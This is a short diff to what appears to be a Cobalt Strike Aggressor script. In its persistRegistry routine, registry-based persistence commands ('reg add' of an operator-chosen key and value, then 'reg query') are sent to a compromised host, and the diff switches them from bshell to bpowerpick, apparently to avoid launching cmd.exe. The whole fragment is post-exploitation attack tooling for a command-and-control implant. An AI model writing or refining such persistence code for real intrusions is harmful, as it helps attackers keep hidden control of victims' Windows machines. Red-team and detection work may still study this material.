@@ -10,8 +10,8 @@ sub persistRegistry {
 			break;
 		}
 		else {
-			bshell($bid, 'reg add "'.$3['reglocation'].'" /v "'.$3['keyname'].'" /t "'.$3['datatype'].'" /d "'.$3['keyvalue'].'" /f');
-			bshell($bid, 'reg query "'.$3['reglocation'].'"');
+			bpowerpick($bid, 'reg add "'.$3['reglocation'].'" /v "'.$3['keyname'].'" /t "'.$3['datatype'].'" /d "'.$3['keyvalue'].'" /f');
+			bpowerpick($bid, 'reg query "'.$3['reglocation'].'"');
 		}
 	}));
 
